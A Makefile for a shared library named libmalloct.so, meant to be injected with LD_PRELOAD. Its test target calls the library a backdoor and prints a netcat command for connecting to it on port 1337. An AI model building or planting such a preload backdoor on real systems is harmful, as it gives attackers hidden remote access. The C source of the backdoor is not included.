cc=clang
cflags=-shared -Wall -fPIC -ldl

target=libmalloct.so

sources=src/*.c

all= $(target)

$(target): $(sources)
	$(cc) $(cflags) -o $@ $^

clean:
	rm -f $(target)

test:
	@echo "test with: LD_PRELOAD=./libmalloct.so ls -aphl /tmp/"
	@echo "backdoor test with: nc -vn 127.0.0.1 1337"
